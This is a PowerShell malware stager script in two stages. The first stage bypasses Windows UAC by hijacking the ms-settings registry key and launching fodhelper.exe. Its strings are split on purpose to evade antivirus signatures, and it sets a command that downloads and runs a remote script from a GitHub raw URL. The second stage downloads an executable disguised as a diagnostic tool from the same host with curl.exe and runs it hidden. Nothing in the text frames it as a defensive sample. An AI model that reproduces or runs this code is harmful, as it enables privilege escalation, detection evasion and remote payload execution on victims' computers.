# --- STAGE 1: PRIVILEGE CHECK & OBFUSCATED UAC BYPASS ---
# This stage remains the same, it just calls the script again with admin rights.
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-Not $isAdmin) {
    try {
        # Obfuscate strings to evade signature detection
        $p1 = "HKCU:\Software\Classes"
        $p2 = "\ms-settings\Shell\Open\command"
        $regPath = $p1 + $p2
        
        # IMPORTANT: This URL must now point to the new script name on your GitHub
        $c1 = "powershell -ExecutionPolicy Bypass -Command `"IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Rajesh141414/loverboy/main/"
        $c2 = "stager_desktop.ps1')`"" # <-- MAKE SURE THIS FILENAME IS CORRECT
        $command = $c1 + $c2

        New-Item $regPath -Force | Out-Null
        Set-ItemProperty $regPath -Name "(Default)" -Value $command -Force | Out-Null
        
        $proc1 = "fod"
        $proc2 = "helper"
        Start-Process ($proc1 + $proc2 + ".exe") -WindowStyle Hidden
        
        Start-Sleep -Seconds 5
        Remove-Item $regPath -Recurse -Force | Out-Null
    } catch {
        exit
    }
    exit
}

# --- STAGE 2: PAYLOAD DEPLOYMENT (ADMIN-ONLY & VISIBLE ON DESKTOP) ---
try {
    # Use a less suspicious downloader (curl.exe) and obfuscate the payload URL
    $urlPart1 = "https://raw.githubusercontent.com/Rajesh141414/loverboy/main/"
    $urlPart2 = "DiagTrackRunner.exe"
    $payloadUrl = $urlPart1 + $urlPart2
    
    # MODIFIED: Set the output path to the current user's Desktop for visibility
    $outputPath = "$env:USERPROFILE\Desktop\diagrunner.exe"
    
    # Use curl, which is a legitimate Windows binary, to download the file.
    curl.exe -L -s -o $outputPath $payloadUrl
    
    # Execute the downloaded payload silently
    Start-Process -FilePath $outputPath -WindowStyle Hidden
} catch {
    exit
}